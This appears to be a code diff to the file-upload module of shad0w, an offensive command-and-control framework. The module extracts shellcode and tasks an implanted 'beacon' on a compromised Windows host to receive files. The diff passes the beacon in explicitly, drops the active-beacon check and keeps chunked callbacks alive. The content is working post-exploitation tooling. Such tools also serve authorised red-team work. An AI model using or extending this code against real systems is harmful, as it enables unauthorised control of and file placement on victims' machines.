@@ -1,4 +1,4 @@
-# 
+#
 # Upload a file
 #
 
@@ -20,13 +20,16 @@ error_list = ""
 FILE_TO_UPLOAD = ""
 FILE_DATA      = ""
 
+# beacon to exec command on
+current_beacon = None
+
 # let argparse error and exit nice
 def error(message):
     global ERROR, error_list
     ERROR = True
     error_list += f"\033[0;31m{message}\033[0m\n"
 
-def exit(status=0, message=None): 
+def exit(status=0, message=None):
     if message != None: print(message)
     return
 
@@ -41,20 +44,18 @@ def upload_callback(shad0w, data):
     return base64.b64encode(FILE_DATA)
 
 
-def main(shad0w, args):
-    global FILE_TO_UPLOAD, FILE_DATA
+def main(shad0w, args, beacon):
+    global FILE_TO_UPLOAD, FILE_DATA, current_beacon
+
+    # make beacon global
+    current_beacon = beacon
 
     # used to determine if we are writing to a path or not
     abs_path = "TRUE"
 
     # save the raw args
     raw_args = args
-    
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.error("ERROR: No active beacon")
-        return
-    
+
     # usage examples
     usage_examples = """
 
@@ -67,7 +68,7 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
     parse = argparse.ArgumentParser(prog='upload',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog=usage_examples)
-    
+
     # keep it behaving nice
     parse.exit = exit
     parse.error = error
@@ -81,10 +82,10 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
         args = parse.parse_args(args[1:])
     except:
         pass
-    
+
     # we need a file to read so if we dont then fail
     if len(args.file) == 0:
-        print(error_list) 
+        print(error_list)
         parse.print_help()
         return
 
@@ -135,6 +136,9 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
     # get the shellcode from the module
     rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/upload/module.exe", want_base64=True)
 
+    # dont clear the callbacks, cause the responses are chunked
+    shad0w.clear_callbacks = False
+
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["callback"] = upload_callback
-    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
+    shad0w.beacons[current_beacon]["callback"] = upload_callback
+    shad0w.beacons[current_beacon]["task"] = (EXEC_ID, rcode)
